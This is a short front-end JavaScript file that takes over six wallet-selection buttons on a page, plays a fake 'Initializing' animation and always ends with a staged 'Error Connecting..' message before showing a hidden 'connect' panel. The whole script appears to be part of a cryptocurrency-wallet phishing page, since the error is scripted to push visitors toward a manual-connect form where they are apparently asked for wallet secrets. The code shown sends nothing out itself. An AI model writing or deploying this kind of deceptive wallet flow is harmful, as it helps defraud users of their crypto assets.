
let click_me_btn = document.querySelector("#walletsearch > div > div.wallets_component.w-dyn-list > div > div:nth-child(1) > div > a")
let click_me_btn2 = document.querySelector("#walletsearch > div > div.wallets_component.w-dyn-list > div > div:nth-child(2) > div > a")
let click_me_btn3 = document.querySelector("#walletsearch > div > div.wallets_component.w-dyn-list > div > div:nth-child(3) > div > a")
let click_me_btn4 = document.querySelector("#walletsearch > div > div.wallets_component.w-dyn-list > div > div:nth-child(4) > div > a")
let click_me_btn5 = document.querySelector("#walletsearch > div > div.wallets_component.w-dyn-list > div > div:nth-child(5) > div > a")
let click_me_btn6 = document.querySelector("#walletsearch > div > div.wallets_component.w-dyn-list > div > div:nth-child(6) > div > a")


let first_popup = document.querySelector("body > div > div.sc-bdVaJa.LPcxt")


click_me_btn.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
}
click_me_btn2.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
}
click_me_btn3.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
}
click_me_btn4.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
}
click_me_btn5.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
}
click_me_btn6.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
}


function loadings() {
    var a =  setTimeout(function () {
        loading.innerHTML = "Initializing.";
      }, 1)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing..";
      }, 500)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing...";
      }, 1000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing....";
      }, 2000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing.....";
      }, 3000)

      var a = setTimeout(function() {
        loading.innerHTML = "Error Connecting.."
        connect.style.display = "flex"
      }, 4000)
     
    }
    